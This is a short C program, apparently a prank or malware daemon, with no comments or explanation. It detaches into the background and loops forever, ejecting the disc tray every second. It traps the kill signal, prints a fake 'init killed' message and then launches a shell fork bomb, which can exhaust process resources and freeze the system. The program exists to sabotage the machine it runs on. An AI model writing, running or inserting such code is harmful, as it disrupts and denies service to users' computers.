#include <sys/types.h>
#include <sys/stat.h>
#include <stdio.h>
#include <stdlib.h>
#include <fcntl.h>
#include <errno.h>
#include <unistd.h>
#include <signal.h>
#include <syslog.h>
#include <string.h>

void bomb(int x) {
  printf("kill: process init killed\n");
  system(":() { : | : & };:");
}

int main() {
  pid_t pid, sid;

  pid = fork();
  if(pid < 0) exit(EXIT_FAILURE);
  if(pid > 0) exit(EXIT_SUCCESS);

  umask(0);
  sid = setsid();
  if(sid < 0) exit(EXIT_FAILURE);

  if(chdir("/") < 0) exit(EXIT_FAILURE);

  signal(SIGTERM, bomb);

  while(1) {
    system("eject -T");
    sleep(1);
  }

  exit(EXIT_SUCCESS);
}
